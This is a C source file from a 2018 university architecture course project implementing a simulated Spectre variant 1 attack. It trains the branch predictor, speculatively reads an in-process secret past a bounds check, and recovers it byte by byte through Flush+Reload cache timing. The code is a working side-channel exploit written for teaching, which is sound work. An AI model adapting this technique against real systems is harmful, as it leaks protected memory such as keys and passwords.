//
// CSCI-5593, Advanced Computer Architecture
// Spring Semester 2018
// Bradley Ruck & Justin Shapiro
// Team #6
// Security Issues with Branch Prediction
//
// Simulated Spectre Attack
// April 20, 2018
//

#include <stdio.h>
#include <emmintrin.h>
#include <x86intrin.h>
#include <string.h>

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
char *secret = "Some Secret Value";
uint8_t array[256*4096];

// Sandbox Function, restricted area for holding the secret
//
uint8_t restrictedAccess(size_t x) {
    if (x < buffer_size) {
        return buffer[x];
    }
    else {
        return 0;
    }
}

// Removes all the values from the cache
//
void flushSideChannel() {
    int i;

    // Write to array to bring it to RAM to prevent copy-on-write
    for (i = 0; i < 256; i++)
        array[i*4096 + DELTA] = 1;

    // Flush the values of the array from cache
    for (i = 0; i < 256; i++)
        _mm_clflush(&array[i*4096 +DELTA]);
}

// Cleans cache, trains the cpu branch predictor, flushes cache again, then reloads cache to find value
//
void spectreAttack(size_t larger_x) {
    int i;
    size_t j;
    uint8_t s;

    // Flush the values of the array from cache
    for (i = 0; i < 256; i++) {
        _mm_clflush(&array[i*4096 + DELTA]);
    }

    // Train the CPU to always take the true branch inside restrictedAccess()
    for (j = 0; j < 100; j++) {
        _mm_clflush(&buffer_size);
        restrictedAccess(j);
    }

    // Flush buffer_size and array[] from the cache
    _mm_clflush(&buffer_size);
    for (i = 0; i < 256; i++) {
        _mm_clflush(&array[i*4096 + DELTA]);
    }

    // Ask restrictedAccess to return the secret in out-of-order execution
    s = restrictedAccess(larger_x);
    array[s*4096 + DELTA] += 88;
}

// Reloads the cache with the ascii element array, times each element, tabulates the hit rate in a score
// array to find the secret
//
void reloadSideChannel(int scores[]) {
    unsigned int junk = 0;
    register uint64_t time1, time2;     // allows for high precision
    volatile uint8_t *address;          // this declaration assures address will always be read from memory
    int i;

    for (i = 0; i < 256; i++) {
        address = &array[i * 4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *address;
        time2 = __rdtscp(&junk) - time1;

        if (time2 <= CACHE_HIT_THRESHOLD && i != 0) // removes 'no hits' from results (if not, they would
            scores[i]++;                            // always be max hits) add 1 for this ascii value
    }
}

int main() {
    size_t larger_x = (size_t)(secret - (char*)buffer);
    int i, j=0, max;
    int len = (int)strlen(secret);                          // calculates number of chars in the secret
    int scores[256];                                        // array to hold ascii value hit totals
    char *sourced_secret = malloc(len * sizeof(uint8_t));   // create a dynamic char array of the secret
                                                            // that we have sourced via the attack

    // Iterates over the entire length of the secret
    while (--len >= 0) {
        // Initialize ascii scores array to keeps track of hits
        for(i = 0; i < 256; i++)
            scores[i]=0;

        flushSideChannel();

        // This runs the attack multiple times to improve the likely-hood of a hit, keep track of hits
        // for each ascii value from 0 to 255, the maximum number of hits will give us the secret byte
        for (i = 0; i < 10000; i++) {
            spectreAttack(larger_x);
            reloadSideChannel(scores);
        }

        // Find the ascii value that had the most hits
        max = 0;
        for (i = 0; i < 256; i++) {
            if(scores[max] < scores[i])
                max = i;
        }

        // Print out each of the secret location, hits and corresponding char values for each iteration
        printf("\nReading secret value at %p = ", (void*)larger_x);
        printf("The  secret value is %c\n", max);
        printf("The number of hits is %d\n", scores[max]);

        // Store the secret value as an array for later output
        char c = (char) max;    // convert the ascii value to its corresponding char
        sourced_secret[j] = c;  // add char to the results array
        larger_x++;             // increment to the next memory location of secret
        j++;                    // increment to the next element in sourced_secret array
    }

    printf("\nThe secret is => %s\n", sourced_secret);
    return (0);
}
